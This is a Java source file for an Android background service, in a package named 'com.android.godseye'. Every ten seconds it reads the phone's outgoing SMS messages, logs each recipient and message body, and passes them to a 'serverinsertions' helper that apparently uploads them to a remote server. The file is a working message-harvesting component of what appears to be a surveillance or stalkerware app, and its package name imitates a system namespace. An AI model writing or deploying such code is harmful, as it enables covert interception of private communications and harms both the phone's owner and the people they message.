package com.android.godseye;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Set;

public class SmsOut extends Service {
    public SmsOut() {
    }


    private final Uri SMS_URI = Uri.parse("content://sms");
    private final String[] COLUMNS = new String[] {"date", "address", "body", "type"};
    private static final String CONDITIONS = "type = 2 AND date > ";
    private static final String ORDER = "date ASC";

    private SharedPreferences prefs;
    private long timeLastChecked;
    private Cursor cursor;
    public static long tmpdate=0;
    SharedPreferences sh;
    

    Handler hnd;

    Runnable rn= new Runnable() {
        @Override
        public void run() {

            try{

                Toast.makeText(getApplicationContext(), "sms out", Toast.LENGTH_SHORT).show();

                timeLastChecked =prefs.getLong("time_last_checked", -1);
                ContentResolver cr = getApplicationContext().getContentResolver();

                cursor = cr.query(SMS_URI, COLUMNS, CONDITIONS + timeLastChecked, null, ORDER);

                Toast.makeText(getApplicationContext(),"time"+timeLastChecked, Toast.LENGTH_LONG).show();
                Toast.makeText(getApplicationContext(),"count"+cursor.getCount(), Toast.LENGTH_LONG).show();
                if (cursor.moveToNext())
                {
                    Set<String> sentSms = new HashSet<String>();
                    timeLastChecked = cursor.getLong(cursor.getColumnIndex("date"));
                    do
                    {
                        long date = cursor.getLong(cursor.getColumnIndex("date"));

                        if(date!=tmpdate) {
                            //Log.d("hhhhhhhhhhhhh0000000000000000000", "" + date);
                            SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");


                            // Create a calendar object that will convert the date and time value in milliseconds to date.
                            //  Calendar calendar = Calendar.getInstance();

                            String date1 = formatter.format(new Date());

                            String address = cursor.getString(cursor.getColumnIndex("address"));
                            @SuppressLint("Range") String body = cursor.getString(cursor.getColumnIndex("body"));
                            String thisSms = date1 + "," + address + "," + body;
                            String msm=body;
                            Log.d("message", thisSms);

                            Toast.makeText(getApplicationContext(), thisSms, Toast.LENGTH_LONG).show();
                            Toast.makeText(getApplicationContext(), "mmmmmmmmmmmm", Toast.LENGTH_SHORT).show();
                            Toast.makeText(getApplicationContext(), address, Toast.LENGTH_SHORT).show();



                            serverinsertions se=new serverinsertions(getApplicationContext());
                            se.insmsg(address,"","",msm,"Outgoing");





                            if (sentSms.contains(thisSms)) {
                                continue; // skip that thing
                            }

                            sentSms.add(thisSms);
                            Log.d("TestOutgoing", "target number: " + address);
                            Log.d("TestOutgoing", "msg..: " + body);
                            Log.d("TestOutgoing", "date..: " + date1);
                        }
                        tmpdate=date;
                    }while(cursor.moveToNext());
                }
                cursor.close();
                SharedPreferences.Editor editor = prefs.edit();
                editor.putLong("time_last_checked", timeLastChecked);
                editor.commit();
            }catch(Exception e){
            }
            Handler hd;

            hnd.postDelayed(rn,10000);

        }
    };

    @Override
    public void onCreate() {
        super.onCreate();


        long  time= System.currentTimeMillis();
        prefs= PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        SharedPreferences.Editor editor = prefs.edit();
        editor.putLong("time_last_checked", time);
        editor.commit();

        hnd=new Handler();
        hnd.post(rn);
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}